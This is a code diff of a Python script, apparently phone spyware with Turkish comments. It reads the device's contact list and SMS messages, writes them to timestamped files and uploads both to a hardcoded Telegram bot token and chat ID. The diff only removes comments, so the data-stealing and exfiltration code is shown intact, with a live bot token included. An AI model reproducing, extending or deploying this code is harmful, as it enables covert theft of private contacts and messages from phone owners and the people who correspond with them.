@@ -5,8 +5,8 @@ import time
 import requests
 
 # Telegram Bot Ayarları
-BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"  # Senin token
-CHAT_ID = "4804654305"  # Senin chat ID
+BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
+CHAT_ID = "4804654305"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 
 def rehber_cal():
@@ -24,7 +24,6 @@ def sms_cal():
         return {"hata": f"SMS'ler alınamadı, naber: {str(e)}"}
 
 def bilgileri_kaydet_ve_gonder():
-    # Dosya adları için zaman damgası
     zaman_damgasi = int(time.time())
     
     # Rehberi al ve kaydet
@@ -51,12 +50,10 @@ def bilgileri_kaydet_ve_gonder():
 
     # Telegram'a gönder
     try:
-        # Rehber dosyasını gönder
         with open(rehber_dosyasi, "rb") as f:
             requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
         print(f"{rehber_dosyasi} Telegram'a gönderildi, kral!")
         
-        # SMS dosyasını gönder
         with open(sms_dosyasi, "rb") as f:
             requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
         print(f"{sms_dosyasi} Telegram'a gönderildi, kral!")
